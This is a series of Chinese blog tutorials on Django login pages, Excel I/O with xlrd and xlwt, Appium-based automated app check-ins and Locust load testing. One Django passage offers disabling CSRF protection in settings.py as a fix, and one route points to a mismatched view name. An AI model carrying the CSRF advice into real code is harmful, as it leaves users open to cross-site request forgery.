M 代表模型（Model），即数据存取层。 该层处理与数据相关的所有事务： 如何存取、如何验证有效性、包含哪些行为以及数据之间的关系等。T 代表模板(Template)，即表现层。 该层处理与表现相关的决定： 如何在页面或其他类型文档中进行显示。V 代表视图（View），即业务逻辑层。 该层包含存取模型及调取恰当模板的相关逻辑。 你可以把它看作模型与模板之间的桥梁。 除了以上三层之外，还需要一个URL分发器，它的作用是将一个个URL的页面请求分发给不同的View处理，View再调用相应的Model和Template django工作流程示意图用户请求对应的地址后，经过views.py文件中函数的处理，渲染后的数据加载到html返回给用户，urls.py、views.py、../templates/xx.html这几个文件在下文中会频繁用到。 前端在之前已经创建好的../sign/templates目录下，新建一个index.html文件，代码如下。 123456789101112131415&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Rayvision Test&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;Rayvision Test&lt;/h1&gt; &lt;form method=\"get\"&gt; &lt;input type=\"text\" name=\"username\" placeholder=\"username\"&gt;&lt;br&gt; &lt;input type=\"password\" name=\"password\" placeholder=\"password\"&gt;&lt;br&gt; &lt;button id=\"btn\" type=\"submit\"&gt;登陆&lt;/button&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; GET请求登陆form标签的method属性设置为get，提交的时候将以get方式去请求。浏览器打开这个html文件，填写之前创建好的账号并登陆，可以看到提交的参数添加到了URL中，username和password为HTML代码中input标签的name属性。 POST请求登陆一般网站登陆的请求大都是post请求，这里我们将form标签的method属性修改成post，然后再去登陆。 1234567...&lt;form method=\"post\"&gt; &lt;input type=\"text\" name=\"username\" placeholder=\"username\"&gt;&lt;br&gt; &lt;input type=\"password\" name=\"password\" placeholder=\"password\"&gt;&lt;br&gt; &lt;button id=\"btn\" type=\"submit\"&gt;登陆&lt;/button&gt;&lt;/form&gt;... 此时发现返回状态码403，禁止访问，这是因为django针对CSRF(跨站请求伪造)有保护措施，在生成的每个表单中放置一个自动生成的令牌，通过这个令牌判断POST请求是否来自同一个网站。 解决办法一：在上面的HTML中使用django的模板标签添加CSRF令牌，在form表单中添加如下。 解决办法二：直接忽略这个CSRF检查，在../guest/settings.py文件中注释掉csrf，如下图。 再去请求登陆就不会报错，此时请求登陆后没有任何反应，因为还没有设置登录后跳转的地方。 处理登陆请求现在已经写好了请求的前端，也有了请求参数，接下来就是交给django服务器来处理请求，首先通过form表单的action属性来指定提交的路径。 123...&lt;form method=\"post\" action=\"/login_action/\"&gt;... 再打开../guest/urls.py文件添加/login_action/的路由。 12345from sign import viewsurlpatterns = [ ... url(r'^login_action/', views.login_action), 然后在../sign/views.py文件编写处理登陆的login_action函数。 123456789101112131415161718from django.shortcuts import renderfrom django.http import HttpResponsefrom django.contrib import auth#登陆def login_action(request): if request.method == 'POST': username = request.POST.get('username', '') password = request.POST.get('password', '') user = auth.authenticate(username=username, password=password) if user is not None: auth.login(request, user) # 登录 request.session['user'] = username # 将session信息记录到浏览器 return HttpResponse('login success!') else: return render(request,'index.html', &#123;'error': 'username or password error!'&#125;) else: return render(request,'index.html') 首先判断请求的方法是否是POST，不是的话返回该页面。 request.POST.get方法获取前端传入的用户名和密码，此处的username和password就是html文件里form表单部分那两个input标签的name属性。 django已经帮我们做好用户体系，使用authenticate()函数认证传入的用户名和密码。它接受两个参数，用户名 username 和密码 password，与数据库中的账户做对比，用户名密码正确的情况下返回给user对象。如果用户名密码不正确，则authenticate()返回 None。 if语句判断authenticate()返回如果不为 None，说明用户认证通过，接下来调用 auth.login()函数进行登陆，通过HttpResponse类返回登陆成功的提示。 认证失败的话，则提示用户名或密码错误，现在页面上没有显示错误提示的地方，这里我们再次用到django的模板语言，在密码输入框下方添加，它对应登陆函数中render返回字典中的 key，并且在登录失败的页面中显示 value，即”username or password error!”信息。 12345678...&lt;form method=\"post\"&gt; &lt;input type=\"text\" name=\"username\" placeholder=\"username\"&gt;&lt;br&gt; &lt;input type=\"password\" name=\"password\" placeholder=\"password\"&gt;&lt;br&gt; &#123;&#123; error &#125;&#125;&lt;br&gt; &lt;button id=\"btn\" type=\"submit\"&gt;登陆&lt;/button&gt;&lt;/form&gt;... 效果图 增强与美化上面我们已经实现了基本的登陆功能，但是是比较粗糙的，登陆成功后只临时用HttpResponse类提示，没有实际意义，页面也不够美观，接下来再写一个登陆成功后跳转的主页，并将登陆页面稍作美化。 登陆界面美化这里推荐一个比较优秀的前端框架Semantic UI，相比于Bootstrap和Foundation，它最大的特点就是非常的语义化，定制化也比较方便。在本地或者网络上导入semantic.css，若在本地导入的话，将下载的semantic.css文件放在../static/css/目录下，然后把之前做好的登陆页面稍作修改。 1234567891011121314151617181920212223242526272829&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Rayvision Test&lt;/title&gt; &lt;link rel=\"stylesheet\" href=\"../static/css/semantic.css\"&gt;&lt;/head&gt;&lt;body style=\"background-color: rgb(230,230,230)\"&gt; &lt;div class=\"ui center aligned grid\" style=\"margin-top: 200px\"&gt; &lt;div class=\"ui six wide column\"&gt; &lt;h1 class=\"ui teal header\"&gt;RAYVISION - TEST&lt;/h1&gt; &lt;div class=\"ui segment\"&gt; &lt;div class=\"ui content\"&gt; &lt;form class=\"ui form\" method=\"post\" action=\"/login_action/\"&gt; &lt;div class=\"field\"&gt; &lt;input type=\"text\" name=\"username\" placeholder=\"username\"&gt;&lt;br&gt; &lt;/div&gt; &lt;div class=\"field\"&gt; &lt;input type=\"password\" name=\"password\" placeholder=\"password\"&gt;&lt;br&gt; &lt;/div&gt; &#123;&#123; error &#125;&#125;&lt;br&gt; &lt;button class=\"ui fluid large teal button\" type=\"submit\"&gt;登陆&lt;/button&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 登录后页面在../sign/templates目录下，新建一个test_manage.html文件，在里面写好需要的内容。然后在../sign/views.py文件中之前写好的login_action函数做修改，将HttpResponse改为HttpResponseRedirect，它可以对路径进行重定向，从而将登录成功之后的请求指向/test_manage/目录。接着在views.py文件中继续创建 test_manage 函数，用于返回test_manage.html 面页。 1234567891011121314151617181920212223242526from django.shortcuts import renderfrom django.http import HttpResponse,HttpResponseRedirectfrom django.contrib import auth#登陆def login_action(request): if request.method == 'POST': username = request.POST.get('username', '') password = request.POST.get('password', '') user = auth.authenticate(username=username, password=password) if user is not None: auth.login(request, user) # 登录 request.session['user'] = username # 将session信息记录到浏览器 response = HttpResponseRedirect('/test_manage/') return response else: return render(request,'index.html', &#123;'error': 'username or password error!'&#125;) else: return render(request,'index.html')#测试项目管理页面def test_manage(request): ... return render(request, \"test_manage.html\") ... 最后不要忘记在../guest/urls.py 文件中添加路径 test_manage/的路由。 1234567...from sign import viewsurlpatterns = [ ... url(r'^test_manage/$', views.event_manage),] 效果图 写在最后django实现登陆功能上下篇已经完结，但是这里介绍的是最基本的登陆功能，用的是django自动生成的user表里的数据，也仅仅实现了主流程，具体项目中按照需要创建新的数据表，根据严谨的测试思维，我们在开发阶段就要尽可能多的想到异常场景，例如用户名密码为空，特殊字符，长度限制等，在前面的登陆处理函数中通过if来判断，另外我们的请求是将密码明文发送出去的，相当不安全，因此还需再实际使用过程中引入所需的加密模块将密码加密。 相关文章python+django实现登陆功能（上篇）xx","categories":[{"name":"Web开发","slug":"Web开发","permalink":"http://yoursite.com/categories/Web%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"django","slug":"django","permalink":"http://yoursite.com/tags/django/"},{"name":"semantic UI","slug":"semantic-UI","permalink":"http://yoursite.com/tags/semantic-UI/"},{"name":"html","slug":"html","permalink":"http://yoursite.com/tags/html/"},{"name":"css","slug":"css","permalink":"http://yoursite.com/tags/css/"}]},{"title":"常用小命令（长期更新）","slug":"常用小命令","date":"2018-01-30T01:30:00.000Z","updated":"2018-12-17T02:30:56.685Z","comments":true,"path":"2018/01/30/常用小命令/","link":"","permalink":"http://yoursite.com/2018/01/30/%E5%B8%B8%E7%94%A8%E5%B0%8F%E5%91%BD%E4%BB%A4/","excerpt":"","text":"前言在平时的测试工作或者自己闲时做的项目中，有一些操作可能是经常用到，每次重复写比较费时，例如批量生成，复制一些文件、文件夹，某个web页面的自动化等，其中有些是Windows系统命令，有些是python的命令，特开一贴记录，将常用的操作都通过python来调用执行，内容可能比较杂，通过关键字搜索找到需要的，长期更新。 DEMO12345678910111213141516171819202122232425262728293031323334353637import time,os,requestsdef mkdir(): '''批量创建文件夹''' path = input('请输入需要创建文件夹的上级路径：') dirs = [path + '/&#123;&#125;'.format(i) for i in range(100)] for dir in dirs: os.makedirs(dir) print(dirs.index(dir)+1)def create_file(): '''批量创建文件''' for i in range(10): cmd = r'fsutil file createnew D:\\test\\10G-&#123;&#125;.txt 10737418240'.format(i) # 10737418240代表10G大小，单位是b，根据需要修改其他大小 os.system(cmd) print('第%d个文件创建完毕'%i)def cy_file(): '''批量复制文件''' for i in range(1,100): cmd = r'copy E:\\test1\\0001.txt E:\\test2\\000&#123;&#125;.txt'.format(i) #使用时修改原路径和目标路径 os.system(cmd) print('%d.txt' % i + ' 复制完毕')def search_port(): '''查询端口占用''' port = input('请输入端口号:') pid = os.popen(r'netstat -ano | findstr %s' % port).read().split(' ')[-1] # 按照空格分隔，只取最后的pid号 task = os.popen(r'tasklist | findstr %s' % pid).read() # 根据pid找到对应的程序 print('占用此端口的程序是： ' + task)if __name__ == '__main__': pass peili","categories":[{"name":"测试","slug":"测试","permalink":"http://yoursite.com/categories/%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"},{"name":"cmd","slug":"cmd","permalink":"http://yoursite.com/tags/cmd/"},{"name":"系统命令","slug":"系统命令","permalink":"http://yoursite.com/tags/%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4/"}]},{"title":"python读写excel表格","slug":"python读写excel表格","date":"2018-01-29T05:03:00.000Z","updated":"2018-12-17T02:30:56.779Z","comments":true,"path":"2018/01/29/python读写excel表格/","link":"","permalink":"http://yoursite.com/2018/01/29/python%E8%AF%BB%E5%86%99excel%E8%A1%A8%E6%A0%BC/","excerpt":"","text":"前段时间接口自动化测试用excel表来管理用例，读取写入的时候遇到了一些小坑，在此做记录。操作excel表的python库有很多，这里只介绍自己使用中感觉兼容性最好最容易使用的xlrd和xlwt，使用方法比较简单，直接查看以下demo即可。 读取数据12345678#首先导入xlrd模块import xlrdworkbook = xlrd.open_workbook('E:/interface_test/test_data.xls') # 打开测试数据表table1 = workbook.sheets()[0] # 选择该excel文件的第一张表，序号从0开始login_url = table1.cell(0,1).value #获取登陆url，第一行第二列name = table1.cell(2,0).value #获取登陆名，第三行第一列pwd = int(table1.cell(2, 1).value) #获取登陆密码，第三行第二列 注意 table1.cell(x,y).value方法获取到的表格数据是str格式，可能用其他方法获取的话不一定是str，根据自己的需要来转换格式 写入数据方法一12345678#首先导入xlwt模块import xlwtworkbook = xlwt.Workbook()sheet = workbook.add_sheet('sheet1', cell_overwrite_ok=True) #设置需要操作得表名sheet.write(5,6,'这是一条测试信息') #在第6行第7列写入内容workbook.save('E:/interface_test/test_data1.xls') #命名并保存print(\"写入成功\") 方法二12345678910#首先导入xlrd和xlutils.copy模块import xlrdfrom xlutils.copy import copyoldWb = xlrd.open_workbook('E:/interface_test/test_data2.xls',formatting_info=True)#打开需要写入的excel文件newWb = copy(oldWb)newWs = newWb.get_sheet(0) #获取excel文件的第一张表newWs.write(2, 2, '需要写入的内容') # 第3行第3列写入内容newWb.save('E:/interface_test/test_data2.xls') #保存print(\"写入成功\") 注意 方法一更多时候是操作新表格，对于已经存在的表格处理就不是很方便了，插入新内容时会把已经存在的内容清空，方法二更适合操作已经存在且文件里面有内容的表格。 可以看到我上面两种操作的excel文件是xls格式，目前office2013，2016版本新建的文件默认是xlsx格式，在使用过程中发现对xlsx格式的文件一直写入失败，这是这两个模块本身的功能不足，所以在使用时尽量用xls格式的文件。 往表格写入内容的时候，表格不能是打开状态，否则会写入失败，在执行脚本前将该文件关闭。peili","categories":[{"name":"测试","slug":"测试","permalink":"http://yoursite.com/categories/%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"}]},{"title":"打造自己的APP任务池","slug":"打造自己的APP任务池","date":"2017-12-19T15:40:00.000Z","updated":"2018-12-17T02:30:56.767Z","comments":true,"path":"2017/12/19/打造自己的APP任务池/","link":"","permalink":"http://yoursite.com/2017/12/19/%E6%89%93%E9%80%A0%E8%87%AA%E5%B7%B1%E7%9A%84APP%E4%BB%BB%E5%8A%A1%E6%B1%A0/","excerpt":"","text":"项目背景[项目地址点击这里]，整体项目框架通过python+appium+unittest实现，参照项目源码食用本篇文章更佳。 如今手机里面现在越来越多的APP需要每天进行签到，点赞，评论，定时给某人发消息，转账等操作，本来想的是用接口自动化来实现，操作的时候发现很多APP的接口(尤其金融类)比较麻烦，userkey、token等字段都是加密且实时变化的，并且接口之间的关联耦合不太容易整理，一个个找接口去签到的话比较费时费力。所以转而用UI自动化来实现，python+appium+unittest写好框架，以后有新的APP只要用几分钟时间把这个APP的任务添加一下就好了，下文中的每一条APP任务实际就是自动化测试中的每一条测试用例。 此框架只有在执行任务的时候才会启动服务和安卓模拟器，执行完毕后自动关闭所有服务和模拟器进程，其他时段不会占用浪费机器资源，另外写此框架的主要目的是替代手工每天能定时跑，所以在任务运行时段Windows机器需要正常稳定，一般放在半夜凌晨执行。 环境准备以下是我使用时候的版本，根据自己情况安装新版的就行，版本不要太旧。 JDK (1.8.0_91) SDK (25.1.7) python 3 node.js (v6.11.0) appium server (1.4.16) Appium-Python-Client (0.24) 雷电安卓模拟器（安卓5.1.1，720*1280） 项目详解流程图简介 1. 获取设备名手机连接电脑或者打开电脑上的安卓模拟器，在cmd命令行直接输入adb devices查看设备名，下面的emulator-5554就是设备名。需要注意的是，有些模拟器自带的adb.exe工具与SDK自带的adb会冲突，具体表现就是打开了模拟器后，adb命令不能正常执行，因为进程冲突了，解决办法是在模拟器安装路径找到adb.exe，把它重新命名或者直接删除。 123C:\\Users\\pei&gt;adb devicesList of devices attachedemulator-5554 device 2. 启动/关闭appium服务启动命令1appium -a 127.0.0.1 -p 4723 -bp 4728 --chromedriver-port 9519 -U emulator-5554 -a 是指定监听的ip（也可写成 –address），默认是本地IP 127.0.0.1，可修改； -p 是指定监听的端口（也可写成 –port），可以修改为你需要的端口； -bp 是连接Android设备bootstrap的端口号，默认是4724（也可写成–bootstrap-port） –chromedriver-port 是chromedriver运行需要指定的端口号，默认是9515 -U 是连接的设备名称，即”adb devices”获取的设备名（也可写成–udid）注：如果只连接了一台设备的话，上面这些参数也可以不用指定，直接在命令行写appium启动就好。 批处理文件以上命令通过python脚本调用系统命令执行以后不太方便直接中断进程，因此换一个思路，将它写到.bat批处理文件，通过脚本来启动执行这个文件，任务结束后，再启动一个批处理文件，获取启动appium服务的窗口句柄并用taskkill强制关闭，实现方法分别如下。 1234rem 启动appium服务@echo offtitle start_appium_servercmd &#x2F;c &quot;appium -a 127.0.0.1 -p 4723 -bp 4728 --chromedriver-port 9519 -U emulator-5554&quot; 1234567rem 关闭appium服务@echo offtitle stop_appium_servertasklist -v | find &quot;start_appium_server&quot;&gt;nulif %errorlevel%&#x3D;&#x3D;0 (taskkill -fi &quot;WINDOWTITLE eq start_appium_server&quot;) 3. 启动/关闭安卓模拟器在安卓模拟器的安装目录找到启动模拟器的可执行文件，将它的路径复制出来，在cmd里输入start +路径命令就能直接启动模拟器，例如我这里是雷电模拟器，其他的类似： 1start D:\\Application\\dnplayer2\\dnplayer.exe 关闭模拟器的话直接taskkill结束进程名就好。 1taskkill -f -im dnplayer.exe 将这两个命令写到一个python文件的两个函数中，方便后面统一调用执行。 1234567891011121314#coding=utf-8import osdef start_android_devices(): '''启动安卓模拟器''' command = r'start D:\\Application\\dnplayer2\\dnplayer.exe' os.system(command) print('模拟器启动成功')def stop_android_devices(): '''结束安卓模拟器进程''' command = r'taskkill -f -im dnplayer.exe' os.system(command) print('所有任务执行完毕，关闭模拟器') 4. 执行APP任务这部分是整个框架的主体部分，每个APP的执行代码都写在这里，用到unittest单元测试框架，所有的函数写在AppTask类中，AppTask继承unittest.TestCase方法。 基础模块基础模块封装了全部APP任务都要用到的公共方法，这里分为两部分。 一是每个APP任务的第一步，即启动APP，此处没有用unittest自带的setUp()方法，而是自定义了一个basic函数，这个函数接受两个参数，分别是APP的包名和启动APP的activity名，APP任务的第一步都是先调用这个公共函数，将driver定义成全局变量。注意：webdriver.Remote方法第一个url参数中间的端口号要与上面启动appium server的端口号一致，默认是4723。 12345678910111213def basic(package_name,activity_name): '''启动应用''' global driver desired_caps = &#123;&#125; desired_caps['platformName'] = 'Android' desired_caps['platformVersion'] = '5.1' desired_caps['deviceName'] = 'emulator-5554' desired_caps['appPackage'] = package_name desired_caps['appActivity'] = activity_name desired_caps[\"unicodeKeyboard\"] = \"True\" desired_caps[\"resetKeyboard\"] = \"True\" driver = webdriver.Remote('http://localhost:4723/wd/hub', desired_caps) time.sleep(20) 二是每个APP任务结束后退出应用，释放appium实例，将关闭APP的代码写在unittest自带的tearDown()方法里面，这个方法不用写在整个文件的最后面，每执行一个test开头的任务后，都会自动执行tearDown()。 123def tearDown(self): '''关闭应用''' driver.quit() APP任务每一个APP任务都写成一个函数，为了使用unittest框架快速批量执行，命名都以test开头，例如京东金融test_001_jd_financ，然后在该函数的第一步先调用上面封装的basic(package_name,activity_name)函数来启动应用，两个参数分别就是京东金融APP的包名和启动APP的activity名，下面以京东金融为例。 123456789101112131415161718192021222324def test_001_jd_finance(self): '''京东金融签到/领取提额包''' #----------启动应用---------- AppTask.basic('com.jd.jrapp','.WelcomeActivity') #----------九宫格滑动解锁---------- TouchAction(driver).press(x=180, y=598).move_to(x=0, y=0).wait(100).move_to(x=0, y=181).wait(100).move_to(x=0, y=181).wait(100).move_to(x=181, y=0).wait(100).move_to(x=181,y=0).release().perform() time.sleep(2) # ----------检验是否有更新---------- update = driver.page_source.find('跳过') #判断是否有更新按钮 if update != -1: driver.find_element_by_id('com.jd.jrapp:id/cancel').click() #点击\"跳过\"，不更新 time.sleep(1) else: pass #----------个人中心签到---------- driver.find_element_by_id('com.jd.jrapp:id/fourthLayout').click() #点击个人中心 time.sleep(1) driver.swipe(100,500,100,500,10) #点击\"签到\"按钮 time.sleep(20) #----------断言是否成功---------- self.assertIn('已签', driver.page_source,msg='任务有失败，请到截图目录查看截图'+str(screenshot_path)) 每个APP任务的最后面都用assert来断言，断言方法有很多种(assertIn，assertNotIn，assertEqual…)，具体方法[点击此处查看]，这里只判断页面中有没有签到成功的字样，就用assertIn包含关系来断言，第一个参数包含在第二个参数内，第二个参数用driver.page_source方法获取当前页面所有元素，msg参数是提示信息。 具体到每个APP任务里面除了基础的功能实现外，最重要的就是做好各种容错处理，哪个页面突然就有了活动或者广告弹窗，又或者应用突然跳出更新的窗口等等，就会打断任务的执行过程，因此在写脚本的时候尽量熟悉APP的操作逻辑，对弹窗做好容错处理，并加上适量的打印信息和截图方便调试和排查错误。 整体任务结构目前任务并不是很多所有APP都写在一个python文件里，以后有新增的任务就直接在这个文件最下面添加新的函数即可，后期如果任务较多可以考虑分开，每个任务单独一个python文件，或者同类型的任务写在一个文件。 12345678910111213141516171819202122#coding=utf-8from appium import webdriverfrom appium.webdriver.common.touch_action import TouchActionimport time,random,unittestclass AppTask(unittest.TestCase): def basic(package_name,activity_name): '''启动应用''' def tearDown(self): '''关闭应用''' def test_001_jd_finance(self): '''京东金融任务''' def test_002_qq(self): '''qq任务''' def test_003_alipay(self): '''支付宝任务''' ... 5. 整合前面已经明确了appium server，安卓模拟器以及具体APP任务的启动和关闭过程，将这些过程整合单独写在一个run.py文件来管理，也就是启动运行整个框架的文件。在这个文件里，有两个主要的函数。 一个是批量执行APP任务并同时生成HTML结果报告的函数设置好APP任务所在的路径后，用unittest.defaultTestLoader.discover方法批量执行任务，同时用HTMLTestRunner生成测试报告。 1234567891011test_path = 'E:/daily_task_2'report_path = 'E:/daily_task_2/report/'def run_tasks(): '''执行所有APP任务''' discover = unittest.defaultTestLoader.discover(test_path, pattern='test_*.py') now = time.strftime('%Y-%m-%d') filename = report_path + now + ' result.html' # 这个filename是生成的自动化测试报告的文件名 fp = open(filename, 'wb') runner = HTMLTestRunner(stream=fp, title='APP任务执行情况') runner.run(discover) fp.close() 另一个是发送邮件函数，将报告发送给自己的邮箱实现简单监控的目的。上一步用HTMLTestRunner已经在本地生成了执行报告，将报告添加至附件发送即可，发送邮件的模块可以参考之前的这篇文章：《定时任务与Python发送邮件(Windows平台)》。 最后依次执行启动appium服务，启动安卓模拟器，执行任务，发送邮件，关闭模拟器，关闭appium服务即可自动完成整套流程。 123456789if __name__ == '__main__': process() #打印当前开发进度 start_appium_server() #启动appium服务 start_android_devices() #启动模拟器 time.sleep(15) run_tasks() #执行APP任务 send_mail() #发送邮件 stop_android_devices() #关闭模拟器 stop_appium_server() # 关闭appium服务 执行报告 绿色代表该APP任务执行成功并断言正确。 橙色代表该APP任务执行成功但断言错误，请查看截图文件或者打开APP确认任务是否完成。 红色代表任务执行失败，可能是APP有更新，页面突然有活动/广告弹窗或者网络问题导致，请检查网络和APP。 ![](http://my.lipeilipei.top/17-12-19/36574735.jpg) peili ---","categories":[{"name":"测试","slug":"测试","permalink":"http://yoursite.com/categories/%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"自动化","slug":"自动化","permalink":"http://yoursite.com/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/"},{"name":"appium","slug":"appium","permalink":"http://yoursite.com/tags/appium/"},{"name":"APP","slug":"APP","permalink":"http://yoursite.com/tags/APP/"},{"name":"unittest","slug":"unittest","permalink":"http://yoursite.com/tags/unittest/"}]},{"title":"python+django实现登陆功能（上篇）","slug":"python+django实现登陆功能（上篇）","date":"2017-11-07T05:30:00.000Z","updated":"2018-12-17T02:30:56.827Z","comments":true,"path":"2017/11/07/python+django实现登陆功能（上篇）/","link":"","permalink":"http://yoursite.com/2017/11/07/python+django%E5%AE%9E%E7%8E%B0%E7%99%BB%E9%99%86%E5%8A%9F%E8%83%BD%EF%BC%88%E4%B8%8A%E7%AF%87%EF%BC%89/","excerpt":"","text":"安装django前提是已经安装python并设置好了环境变量，然后在cmd命令行直接通过pip安装django。 1pip install Django 创建项目在命令行输入命令，项目会创建在执行命令所在的目录，例如这里生成名为gust的项目。 1django-admin startproject gust 创建APP上一步创建项目后自动创建了gust的目录，cd进入gust目录，输入以下命令创建一个签到系统的app模块，然后在项目settings.py文件的”INSTALLED_APPS”里添加”sign”。 1python manage.py startapp sign 此时就创建好了项目和app。sign目录下还有两个手动创建的文件夹static和templates，分别存放图片,css静态文件和html前端页面，需要注意的是这两个文件夹的名称是固定写法，不要随意命名。 启动项目1python manage.py runserver 默认端口是8000，如果端口被占用，修改端口的话在上面命令的最后加上需要修改的端口号。 1python manage.py runserver 8001 在cmd窗口复制url到浏览器http://127.0.0.1:8000/，看到下面这个图就表示已经启动成功。 创建超级管理员1python manage.py createsuperuser 输入username：admin输入Email：xxxx@qq.com输入密码：xxx确认密码：xxx(注：输入密码的过程中不会有显示) 生成表1python manage.py migrate django自带了功能比较完善的后台管理系统，不用我们再去开发后台，这也是django强大的地方之一，现在就可以用刚刚创建的管理员账号登陆后台了。 http://127.0.0.1:8000/admin 相关文章python+django实现登陆功能（下篇）xx","categories":[{"name":"Web开发","slug":"Web开发","permalink":"http://yoursite.com/categories/Web%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"django","slug":"django","permalink":"http://yoursite.com/tags/django/"}]},{"title":"appium 九宫格解锁（python）","slug":"appium-九宫格解锁","date":"2017-10-19T10:30:00.000Z","updated":"2018-12-17T02:30:56.857Z","comments":true,"path":"2017/10/19/appium-九宫格解锁/","link":"","permalink":"http://yoursite.com/2017/10/19/appium-%E4%B9%9D%E5%AE%AB%E6%A0%BC%E8%A7%A3%E9%94%81/","excerpt":"","text":"京东金融APP为例刚开始想的是先获取父级标签然后按照比例计算每个点的位置，这样算出来相对位置，好处是无论在什么分辨率的设备下执行脚本都能正常执行。但是京东金融进入页面的九宫格9个点并不是在一个父元素里面，而是整个页面被等分成三块，因此这种方法并不好用，只能退而求其次直接用每个点的坐标来定位了。 用到的方法123from appium.webdriver.common.touch_action import TouchAction.TouchAction(driver).press(x&#x3D;180, y&#x3D;598).move_to(x&#x3D;0, y&#x3D;0).wait(100).move_to(x&#x3D;0, y&#x3D;181).wait(100)xxxxxx省略xxxxxx.move_to(x&#x3D;181,y&#x3D;0).release().perform() 首先要明确的是这个方法滑动不是通过每两个点的绝对坐标来操作的，而是两个点之间的偏移量来操作的，向右向下滑动偏移量为正，向左向上滑动偏移量为负。 详细操作手机开启开发者选项，在开发者选项里面打开&quot;指针位置&quot;,这样鼠标点击或者滑动的时候上面就能实时显示横纵坐标。 1.确定九宫格左上角第一个点的绝对坐标TouchAction(driver).press方法里第一个点的坐标要写完整坐标，不是偏移量，并且是点两次，只点一次的话会跳过第一个点，所以先写TouchAction(driver).press(x=180, y=598)，然后.move_to(x=0, y=0)，横纵坐标偏移量都是0，也就是移动到第一个点它本身，相当于按住第一个点。 2.确定第二个点的坐标偏移量第二个点修改偏移量.move_to(x=0, y=181)，在第一个点的基础上向下滑动181个像素，即横坐标不变，纵坐标写181，后面的点依次类推，每个点的滑动完成后加上.wait(100)等待时间。 示例截图及代码 123456789101112131415161718192021#coding=utf-8from appium import webdriverimport timefrom appium.webdriver.common.touch_action import TouchActiondef jd_finance(package_name,activity_name): #启动应用 desired_caps = &#123;&#125; desired_caps['platformName'] = 'Android' desired_caps['platformVersion'] = '5.1' desired_caps['deviceName'] = 'emulator-5554' desired_caps['appPackage'] = package_name desired_caps['appActivity'] = activity_name desired_caps[\"unicodeKeyboard\"] = \"True\" desired_caps[\"resetKeyboard\"] = \"True\" driver = webdriver.Remote('http://localhost:4723/wd/hub', desired_caps) time.sleep(5) #滑动解锁九宫格 TouchAction(driver).press(x=180, y=598).move_to(x=0, y=0).wait(100).move_to(x=0, y=181).wait(100).move_to(x=0, y=181).wait(100).move_to(x=181, y=0).wait(100).move_to(x=181,y=0).release().perform() peili","categories":[{"name":"测试","slug":"测试","permalink":"http://yoursite.com/categories/%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"自动化","slug":"自动化","permalink":"http://yoursite.com/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/"},{"name":"appium","slug":"appium","permalink":"http://yoursite.com/tags/appium/"},{"name":"APP","slug":"APP","permalink":"http://yoursite.com/tags/APP/"}]},{"title":"性能测试 - locust简单使用","slug":"locust","date":"2017-09-15T04:30:00.000Z","updated":"2018-12-17T02:30:56.877Z","comments":true,"path":"2017/09/15/locust/","link":"","permalink":"http://yoursite.com/2017/09/15/locust/","excerpt":"","text":"locust简介 Locust是一个用于可扩展的，分布式的，性能测试的，开源的，用Python编写框架/工具，它非常容易使用，也非常好学。它的主要思想就是模拟一群用户将访问你的网站。每个用户的行为由你编写的python代码定义，同时可以从Web界面中实时观察到用户的行为。 经过不断的更新，现在对python2和python3都能很好的支持。[官网地址] 优势1.安装操作都很简单，没有臃肿的客户端，通过python语言灵活编写测试脚本2.基于协程而不是线程和进程，相比较LR和jmeter更节约机器资源，单机能模拟更多的用户 弱势1.市场占有率低，用户群体少，可供参考的文章教程也有限2.没有录制功能，只能手动编写测试脚本，需要一定的python编程能力 locust安装可以直接用pip安装，或者下载安装包到本地，解压以后用python setup.py install安装,python3安装的时候会自动把依赖库都安装好。 1. 直接用pip安装1pip install locustio 2.报错解决我在使用的时候发现第一种pip安装方式安装成功后，启动locust --help命令的时候可能会出现如下错误。ImportError: No module named &#39;core&#39;解决办法：1.先卸载掉第一次安装的，卸载命令 1pip uninstall locustio 2.然后再输入如下命令从GitHub获取源码安装 1pip install git+https:&#x2F;&#x2F;github.com&#x2F;locustio&#x2F;locust 简单性能测试脚本新建一个.py文件，编写如下比较简单的测试脚本并保存。 1234567891011121314from locust import HttpLocust,TaskSet,task#定义用户行为class TestBaiDu(TaskSet): @task def baidu_page(self): self.client.get(&#39;&#x2F;&#39;) #这里不填写具体的链接，执行命令的时候再指定class WebsiteUser(HttpLocust): task_set &#x3D; TestBaiDu min_wait &#x3D; 3000 #设置适当的等待时间，模拟真实用户行为，单位是毫秒 max_wait &#x3D; 5000 启动locust命令前提：locust.exe可执行文件的路径经添加到环境变量 1locust -f xxx.py --host&#x3D;http:&#x2F;&#x2F;www.baidu.com 需要测试哪个url，可以在输入命令时随时很方便的更改，这也是为什么不在前面的脚本里把url写死的原因，这里以百度首页为例。 开始执行本机浏览器进入 http://localhost:8089 。locust本身没有用户界面，这个界面时基于flask框架开发的web页面，因此flask库也是它必装的依赖库。第一个输入框：请求总用户数第二个输入框：每秒请求的用户数 主要指标 median 请求响应时间的中位数 （毫秒） average 相应时间平均数（毫秒） min 最小值（毫秒） max 最大值（毫秒） content size 页面返回的大小（单位是b） 趋势图点击上方导航栏切换到charts，可以看到图示化的折线图，包括TPS,平均响应时间，用户总数等 导出数据点击上方导航栏切换到Download Data，可以下载CSV格式的测试数据 